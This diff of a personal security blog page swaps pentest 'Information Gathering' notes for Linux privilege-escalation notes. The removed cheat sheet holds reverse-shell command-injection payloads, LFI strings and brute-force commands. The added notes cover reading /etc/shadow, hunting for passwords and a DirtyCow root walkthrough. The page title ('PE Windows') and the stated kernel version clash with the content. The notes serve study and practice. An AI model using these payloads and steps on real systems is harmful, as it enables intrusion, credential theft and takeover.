@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en-us">
   <head>
-    <title>Notes - Information Gathering // FMisi&#39;s security.log</title>
+    <title>Notes - PE Windows // FMisi&#39;s security.log</title>
     <link rel="shortcut icon" href="../favicon.ico" />
     <meta charset="utf-8" />
     <meta name="generator" content="Hugo 0.105.0">
@@ -47,177 +47,107 @@
       <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="fmisi" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
       <script src="/js/crypto-js.min.js"></script>
       <script src="/js/dice.js"></script>
-      <h1 class ="post-title">Notes - Information Gathering</h1>
+      <h1 class ="post-title">Notes - Linux Privilege Escalation</h1>
       <div class="post-meta">
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
   <title>calendar</title>
   <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
 </svg>
-          Dec 13, 2022
+          Dec 12, 2022
         </div>
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          3 min read
+          4 min read
         </div>
       </div>
     </header>
     <div class="post-content">
-      <h1 id="port-scanning-using-nmap">Port scanning using nmap</h1>
+	<h1 id="init-linux-pe">Initial Enumeration Commands for Linux PE</h1>
+</code></pre><h3 id="init-linux-pe">System Enumeration</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; whoami</span>
+</span></span><span style="display:flex;"><span>&gt; id</span>
+</span></span><span style="display:flex;"><span>&gt; w</span>
+</span></span><span style="display:flex;"><span>&gt; groups</span>
+</span></span><span style="display:flex;"><span>&gt; sudo -l</span>
+</span></span><span style="display:flex;"><span>&gt; hostname</span>
+</span></span><span style="display:flex;"><span>&gt; uname -a</span>
+</span></span><span style="display:flex;"><span>&gt; cat /proc/version</span>
+</span></span><span style="display:flex;"><span>&gt; cat /etc/issue</span>
+</span></span><span style="display:flex;"><span>&gt; lscpu</span>
+</span></span><span style="display:flex;"><span>&gt; ps aux</span>
+</span></span><span style="display:flex;"><span>&gt; ps aux | grep root</span>
+</code></div>
+
+It is important to note that there are User Enumeration commands among <s>us</s> the System Enumeration commands. For example, getting to know the output of sudo -l is almost always more important than getting to know the output of lscpu.
+
+</code></pre><h3 id="init-linux-pe">User Enumeration</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; cat /etc/passwd</span>
+</span></span><span style="display:flex;"><span>&gt; cat /etc/passwd | cut -d : -f 1</span>
+</span></span><span style="display:flex;"><span>&gt; cat /etc/shadow</span>
+</span></span><span style="display:flex;"><span>&gt; cat /etc/group</span>
+</span></span><span style="display:flex;"><span>&gt; history</span>
+</span></span><span style="display:flex;"><span>&gt; sudo su -</span>
+</code></div>
+
+</code></pre><h3 id="init-linux-pe">Network Enumeration</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; ifconfig</span>
+</span></span><span style="display:flex;"><span>&gt; route</span>
+</span></span><span style="display:flex;"><span>&gt; ip route</span>
+</span></span><span style="display:flex;"><span>&gt; arp -a</span>
+</span></span><span style="display:flex;"><span>&gt; ip neigh</span>
+</span></span><span style="display:flex;"><span>&gt; netstat -ano</span>
+</code></div>
+
+</code></pre><h3 id="init-linux-pe">Password Hunting</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null</span>
+</span></span><span style="display:flex;"><span>&gt; locate password | more</span>
+</span></span><span style="display:flex;"><span>&gt; locate pass | more</span>
+</span></span><span style="display:flex;"><span>&gt; locate passwd | more</span>
+</span></span><span style="display:flex;"><span>&gt; history</span>
+</span></span><span style="display:flex;"><span>&gt; sudo su -</span>
+</code></div>
+</code>
+In this entry we will see how to escalate privileges via kernel expoits with DirtyCow and via sudo rights with wget.
+I would like to highlight that there are several other escalation paths. The escalation paths are:</br>
+Kernel Exploits, Passwords and File Permissions, Sudo, SUID, Capabilities, Scheduled Tasks, NFS Root Squashing,
+and Docker.
+</pre><h3 id="kernel-exp">Kernel Exploits</h3>
+What is a Kernel?</br>
+The Kernel is a computer program that controls everything in the system.</br>
+The Kernel helps interactions between hardware and software components.</br>
+The Kernel is a translator.</br></br>
+Let's say we are running the <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; uname -a</span></span></span></code></div>
+command as the lower privileged user and we see this: <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>Linux debian 2.6.32-5-amd64 #1 SMP Mon Dec 12 16:34:35 2022 x86_64 GNU/Linux</span></span></span></code></div>
+
+Seems like the kernel version is 2.6.35. which might be vulnerable to something as this version is pretty old.</br>
+Uploading then running <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; ./linux-exploit-suggester.sh</span></span></span></code></div>
+we can see that the suggester has several suggestions for us.</br>
+An interesting suggestion is dirtycow.</br></br>
+<img src="../screen1.png" height="100%" width="100%"></br></br>
+Looking at the exploit-db website that can be found in the output, we can see that this exploit really is applicable to this kernel version.</br>
+Uploading then running <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; gcc -pthread c0w.c -o cow</span></span></span></code></div>
+we can compile the DirtyCow C program (if gcc is installed).</br>
+Running the program with the <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; ./cow</span></span></span></code></div>
+we can see that the /usr/bin/passwd and the /tmp/bak file has been backed up. It's backed up because DirtyCow modified these files so we can use them to escalate our privileges.</br>
+If we type the <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; passwd</span></span></span></code></div>
+command then press enter, we can see that we successfully escalated our privileges to root.</br></br>
+<img src="../screen2.png" height="100%" width="100%"></br>
+<h3 id="kernel-exp">Sudo</h3>
+Escalating privileges with the sudo right of wget is discussed in the vk9-sec.com webpage which can be found among the Useful References.</br></br>
+~Thank you for reading~
+
+<h3 id="useful-references">Useful references</h3>
 <ul>
-<li>Use <code>-vvv</code> for nmap scan to increase verbosity</li>
-</ul>
-<pre tabindex="0"><code># TCP Scan
-&gt; TARGET=&lt;TARGET&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+<li><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a></li>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></li>
+<li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a></li>
+<li><a href="https://github.com/firefart/dirtycow">DirtyCow</a></li>
+<li><a href="https://vk9-sec.com/wget-privilege-escalation/">PE with sudo wget</a></li>
 
-# Vulnerability Scan
-&gt; nmap -n -sV --script vuln &lt;TARGET&gt; -Pn -vvv
-
-# UDP scan
-&gt; nmap -p- --min-rate=1000 -T4 &lt;TARGET&gt; -Pn -sU -vvv
-
-# Output in all formats
-&gt; nmap -p- -sC -sV -oA tcp_all_ports &lt;TARGET&gt;
-</code></pre><h1 id="specific-purpose-scanning">Specific purpose scanning</h1>
-<h2 id="ftp-bruteforce">FTP bruteforce</h2>
-<pre tabindex="0"><code># nmap
-&gt; nmap --script ftp-brute -p 21 &lt;TARGET&gt; -Pn
-
-# hydra
-&gt; hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://&lt;TARGET&gt;
-
-# ncrack
-&gt; ncrack -v -U /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://&lt;TARGET&gt;
-</code></pre><h2 id="udp-69-tftp">UDP 69 tftp</h2>
-<pre tabindex="0"><code>&gt; nmap -n -Pn -sU -p69 -sV --script tftp-enum &lt;TARGET&gt;
-</code></pre><h1 id="simple-nc-scanner">Simple nc scanner</h1>
-<h2 id="nc-port-scanner-oneliner">nc port scanner oneliner</h2>
-<pre tabindex="0"><code># Normal scanning
-&gt; for p in {1..65535}; do nc -vn &lt;TARGET&gt; $p -w 1 -z &amp; done 2&gt; output.txt
-
-# Using proxychains
-&gt; for p in {1..65535}; do proxychains -q nc -vn &lt;TARGET&gt; $p -w 1 -z &amp; done 2&gt; output.txt
-</code></pre><h2 id="nc-port-scanner-script">bash port scanner script</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>host<span style="color:#f92672">=</span>$1
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> port in <span style="color:#f92672">{</span>1..65535<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
-</span></span><span style="display:flex;"><span> timeout .1 bash -c <span style="color:#e6db74">&#34;echo &gt;/dev/tcp/</span>$host<span style="color:#e6db74">/</span>$port<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;&amp;</span>
-</span></span><span style="display:flex;"><span> echo <span style="color:#e6db74">&#34;port </span>$port<span style="color:#e6db74"> is open&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Done&#34;</span>
-</span></span></code></pre></div><h1 id="web-path-discovery">Web path discovery</h1>
-<h2 id="general-tips">General tips</h2>
-<ul>
-<li>Some mis-spelled paths may give a hint.</li>
-<li>Don&rsquo;t forget to vuln-search using google.</li>
-<li>When GET doesn&rsquo;t give anything, try POST</li>
-<li>If cannot find http, try https</li>
-</ul>
-<h2 id="dirb">dirb</h2>
-<pre tabindex="0"><code># Using a common wordlist
-&gt; dirb http://&lt;TARGET&gt;
-&gt; dirb http://&lt;TARGET&gt; /usr/share/wordlists/dirb/common.txt
-
-# Using a bigger wordlist
-&gt; dirb http://&lt;TARGET&gt; /usr/share/wordlists/dirb/big.txt
-
-# Amplify search with this extensions
-&gt; dirb http://&lt;TARGET&gt; /usr/share/wordlists/dirb/big.txt -X .php,.txt,.json,.html
-
-# Recursive search
-&gt; dirb http://&lt;TARGET&gt; -r
-
-# Other recommended wordlists
-* /usr/share/wordlists/SecLists/Discovery/Web-Content/CGIs.txt
-* /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
-</code></pre><h2 id="dirsearch">dirsearch</h2>
-<pre tabindex="0"><code>&gt; dirsearch -u http://&lt;TARGET&gt; -e php,asp,aspx,jsp,js,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f -r
-
--e EXTENSIONS, --extensions=EXTENSIONS  Extension list separated by comma (Example: php,asp)
--f, --force-extensions  Force extensions for every wordlist entry (like in DirBuster)
--r, --recursive
-</code></pre><h2 id="fuff">fuff</h2>
-<pre tabindex="0"><code>&gt; ffuf -w /usr/share/wordlists/dirb/big.txt -H &#34;Content-Type: application/json&#34; -H &#34;Cookie:...&#34; -X POST  -u http://url/ -d &#39;{&#34;FUZZ&#34;: &#34;value&#34;}&#39; -mc all -fr &#34;specific_term&#34; -c -v
-</code></pre><h2 id="wfuzz">wfuzz</h2>
-<pre tabindex="0"><code>&gt; wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt --sc 200 http://&lt;TARGET&gt;/FUZZ
-</code></pre><h1 id="subdomain-enumeration">Subdomain enumeration</h1>
-<h2 id="gobuster">gobuster</h2>
-<pre tabindex="0"><code>&gt; gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://&lt;TARGET&gt;
-</code></pre><h2 id="wfuzz-1">wfuzz</h2>
-<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://&lt;TARGET&gt;/&#34; -H &#34;Host: FUZZ.&lt;TARGET&gt;&#34; --hl 107
-* /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
-</code></pre><h2 id="fuff-1">fuff</h2>
-<pre tabindex="0"><code>&gt; ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://&lt;TARGET&gt;/ -H &#34;Host: FUZZ.&lt;TARGET&gt;&#34; -fl 10
-</code></pre><h1 id="web-probing">Web probing</h1>
-<h2 id="curl">curl</h2>
-<pre tabindex="0"><code># basic-auth
-&gt; curl --user &lt;user&gt;:&lt;pass&gt; &lt;TARGET&gt;:&lt;port&gt;/pwn.php
-
-# find all text on a page
-&gt; curl http://&lt;TARGET&gt;/ | html2text
-
-# parse href in curl response
-&gt; curl http://&lt;TARGET&gt;/ | sed -n &#39;s/.*href=&#34;\([^&#34;]*\).*/\1/p&#39;
-&gt; curl &lt;TARGET&gt; -s -L | grep &#34;title\|href&#34; | sed -e &#39;s/^[[:space:]]*//&#39;
-</code></pre><h2 id="lfi">lfi</h2>
-<pre tabindex="0"><code># lfi via php filter
-&gt; curl http://&lt;TARGET&gt;/index.php?m=php://filter/convert.base64-encode/resource=index
-
-# lfi via string injection
-&gt; http://&lt;TARGET&gt;/index.php?page=&#39;.system(&#39;ls&#39;).&#39;
-</code></pre><h2 id="cmd-injection">cmd injection</h2>
-<ul>
-<li><code>${IFS}</code> can be used as space for linux targets</li>
-</ul>
-<pre tabindex="0"><code>&gt; nc${IFS}&lt;TARGET&gt;${IFS}&lt;PORT&gt;${IFS}-e${IFS}bash
-</code></pre><ul>
-<li><code>%0a</code> can be used as newline for IE and inproperly sanitised webapp</li>
-</ul>
-<pre tabindex="0"><code>&gt; index.php?page=user%0a&lt;cmd-payload&gt;
-</code></pre><ul>
-<li><code>;</code> can be used to concat another command</li>
-</ul>
-<pre tabindex="0"><code>aaaa;nc+-e+/bin/sh+&lt;TARGET&gt;
-</code></pre><h2 id="http-headers-injection">http headers injection</h2>
-<ul>
-<li>Apache log poisoning: write through User-Agent or URL into the log file and achieve RCE through LFI</li>
-<li>Use burp to avoid encoding issues</li>
-<li>http headers maybe spoofable, <code>X-Forwarded-For: 127.0.0.1</code></li>
-</ul>
-<h2 id="sqlmap">sqlmap</h2>
-<pre tabindex="0"><code># get
-&gt; sqlmap -u http://&lt;TARGET&gt;/login.php?search=test 
-
-# post
-&gt; sqlmap -u http://&lt;TARGET&gt;/login.php?login=true -p user,password --data &#34;user=1&amp;password=2&#34; --method POST
-</code></pre><h2 id="image-upload">Image upload</h2>
-<ul>
-<li>Some the upload only checks for extension, change the extension before upload, then capture the request and change the filename parameter in the request body.</li>
-<li>It is preferrable to use png where possible, because the format is cleaner than jpg/jpeg</li>
-<li>GIF upload: a text file with the "GIF87a" magic byte without the quotes will be a GIF file</li>
-</ul>
-<h2 id="svn">svn</h2>
-<ul>
-<li>Useful when you find a svn repo over the web</li>
-</ul>
-<pre tabindex="0"><code># get commit logs
-&gt; svn log --username admin --password admin http://&lt;TARGET&gt;/svn/dev/
-
-# show differences
-&gt; svn diff -r 3:1 --username admin --password admin http://&lt;TARGET&gt;/svn/dev/
-</code></pre><h1 id="exploits-search">Exploits Search</h1>
-<ul>
-<li>CTF search: <a href="https://ippsec.rocks/">https://ippsec.rocks/</a></li>
-<li>CVE POC: <a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></li>
-</ul>
-<h1 id="useful-references">Useful references</h1>
-<ul>
-<li>Default username and passwords: <a href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li>
-<li><a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li>
-<li><a href="https://www.hackingarticles.in/">https://www.hackingarticles.in/</a></li>
 </ul>
 
     </div>
